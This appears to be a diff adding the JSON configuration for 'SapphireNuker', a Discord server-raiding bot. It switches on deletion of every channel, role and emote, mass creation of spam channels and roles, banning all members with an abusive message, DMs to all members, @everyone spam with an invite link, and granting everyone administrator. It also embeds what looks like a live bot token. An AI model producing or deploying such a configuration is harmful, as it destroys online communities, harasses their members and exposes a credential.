@@ -1,0 +1,49 @@
+{
+	"general": {
+		"token": "ODY0ODAyOTQyNDI2NDE1MTM0.YO6wgA.24MR1kd6l5x51TH9qY6wFkiJr1A",
+		"prefix": "sp!"
+		
+	},
+	"bot_customization": {	
+		"customize_bot": false,
+		"bot_username": "𝙎𝙖𝙥𝙥𝙝𝙞𝙧𝙚𝙉𝙪𝙠𝙚𝙧",
+		"bot_avatar": "https://i.ibb.co/wSPF6LR/standard-2.gif",
+		"bot_activity": "dau muita <3"
+	},
+	"channels": {
+		"delete_channels": true,
+		"create_channels": true,
+		"channels_name": "𝘎𝘦𝘵 𝘚𝘢𝘱𝘱𝘩𝘪𝘳𝘦𝘥 𝘋𝘰𝘨",
+		"channels_topic": "SapphireNuker was here | https://discord.gg/7EA8BvbPQa | <3",
+		"channels_amount": 250
+	},
+	"roles": {
+		"delete_roles": true,
+		"create_roles": true,
+		"roles_name": "👯‍♀️ be buried alive 🪦",
+		"roles_color": "0xffe699",
+		"roles_amount": 125
+
+	},
+	"dmall": {
+	
+		"dmall": true,
+		"dmamount": 5
+	},
+	"emotes": {
+		"delete_emotes": true
+	},
+	"ban": {
+		"ban_all": true,
+		"ban_reason": "Get sapphired bitch"
+	},
+	"spam": {
+		"spam_message": "@everyone | https://discord.gg/7EA8BvbPQa | SapphireNuker is here (❁´◡`❁) | <3"
+	},
+	"server": {
+		"server_name": "𝙎𝙖𝙥𝙥𝙝𝙞𝙧𝙚 𝙬𝙖𝙨 𝙝𝙚𝙧𝙚 <3",
+		"server_icon_url": "https://i.ibb.co/ykZPb5M/tenor.gif",
+		"banner": "https://i.ibb.co/gdgrpfQ/b-X5xb-Yp9i-DJjh-S4j-QCIA5cqe6-DGRHb-JZNGP9-En7-PGHU-1.jpg",
+		"give_everyone_administrator": true
+	}	
+}
